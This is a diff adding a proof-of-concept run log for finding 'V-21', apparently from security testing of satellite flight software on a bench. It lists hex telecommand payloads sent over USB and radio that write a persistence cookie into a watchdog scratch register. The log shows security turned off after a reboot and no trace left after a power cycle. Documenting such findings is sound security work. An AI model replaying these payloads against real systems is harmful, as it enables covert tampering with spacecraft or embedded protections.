@@ -1,0 +1,73 @@
+[   0.000] ========================================================================
+[   0.000] V-21 watchdog scratch persistence cookie
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.847] --> TC apid=0x0A via=usb AES  payload=00
+[   8.898] <-- TM apid=0x0A clear len=3
+[   8.950] --> TC apid=0x1D via=usb clear payload=0101
+[   9.001] <-- TM apid=0x1D clear len=4
+[   9.001] --> TC apid=0x11 via=usb clear payload=00
+[   9.461] <-- TM apid=0x11 clear len=9
+[   9.461] --> TC apid=0x15 via=usb clear payload=001005
+[   9.912] <-- TM apid=0x15 clear len=6
+[   9.912] --> TC apid=0x0D via=usb clear payload=01
+[  10.363] <-- TM apid=0x0D clear len=4
+[  10.404] --> TC apid=0x1D via=usb clear payload=03
+[  10.455] <-- TM apid=0x1D clear len=4
+[  10.455] <-- TM apid=0x09 clear len=9
+[  10.506] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.558] <-- TM apid=0x1D clear len=4
+[  10.558] --> TC apid=0x10 via=usb clear payload=00
+[  10.609] <-- TM apid=0x10 clear len=4
+[  10.609] --> TC apid=0x21 via=usb clear payload=00
+[  11.070] <-- TM apid=0x21 clear len=6
+[  11.070] --> TC apid=0x24 via=usb clear payload=0000
+[  11.111] <-- TM apid=0x24 clear len=8
+[  11.111] --> TC apid=0x24 via=usb clear payload=0100
+[  11.162] <-- TM apid=0x24 clear len=8
+[  11.162] --> TC apid=0x24 via=usb clear payload=0200
+[  11.214] <-- TM apid=0x24 clear len=8
+[  11.214] --> TC apid=0x24 via=usb clear payload=0300
+[  11.265] <-- TM apid=0x24 clear len=8
+[  11.265] --> TC apid=0x25 via=usb clear payload=0080
+[  11.307] <-- TM apid=0x25 clear len=4
+[  11.307] --> TC apid=0x1E via=usb clear payload=01
+[  11.819] <-- TM apid=0x1E clear len=5
+[  11.819] --> TC apid=0x1D via=usb clear payload=0b
+[  11.911] <-- TM apid=0x1D clear len=4
+[  11.911] --> TC apid=0x05 via=usb clear payload=12
+[  12.371] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.872] <-- TM apid=0x1F clear len=4
+[  12.872] --> TC apid=0x1F via=usb clear payload=05
+[  13.374] <-- TM apid=0x1F clear len=4
+[  13.374] --> TC apid=0x0A via=usb clear payload=01
+[  13.429] <-- TM apid=0x0A AES len=3
+[  21.557] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.038] <-- TM apid=0x0E AES len=18
+[  30.038] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.142] --> TC apid=0x1A via=radio AES  payload=5045525300000000000000000000000000000000000000000000000000000000
+[  30.193] <-- TM apid=0x1A clear len=8
+[  30.245] --> TC apid=0x18 via=radio AES  payload=00200020488005400400
+[  30.706] <-- TM apid=0x18 clear len=12
+[  30.707] MEMCPY 'PERS' -> scratch7 (0x40058048) ok
+[  30.748] --> TC apid=0x02 via=radio AES  payload=-
+[  34.419] <-- TM apid=0x02 clear len=4
+[  34.419] RESETC ack: boot_count=1 cookie_flag=1
+[  40.286] --> REARM (bench parity: board rebooted mid-session)
+[  40.327] --> TC apid=0x14 via=usb clear payload=406c841500e055bb801a060008
+[  48.804] <-- TM apid=0x0E clear len=18
+[  48.866] --> TC apid=0x0C via=usb clear payload=-
+[  48.918] <-- TM apid=0x0C clear len=27
+[  48.970] post-reboot flags2=0x24 PERSIST=True secure=False
+[  48.970] --> POWER CYCLE (scratch + SRAM die, flash survives)
+[  51.186] --> REARM (bench parity: post-POWERCYCLE)
+[  51.340] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  59.820] <-- TM apid=0x0E AES len=18
+[  59.821] --> TC apid=0x0C via=usb AES  payload=-
+[  59.885] <-- TM apid=0x0C AES len=27
+[  59.927] after power cycle: secure=True PERSIST=False (scratch is volatile)
+[  59.927] => attacker toggles a protection policy whose very existence leaves no forensic trace after the next power cycle
+[  59.927] -- console tail: [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [INFO] USB Device configured successfully | [INFO] ACC OK | [INFO] BME OK | [INFO] GPS UART configured at 9600 baud | [INFO] Radio 0 Configured Successfully! | [INFO] Radio 1 Configured Successfully! | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x014 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [WARN] GPS not detected on UART, using zero-coordinate fallback | [TC - SPP] APID=0x00C SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO
+[  59.927] ========================================================================
+[  59.927] POC OK
+[  59.927] ========================================================================
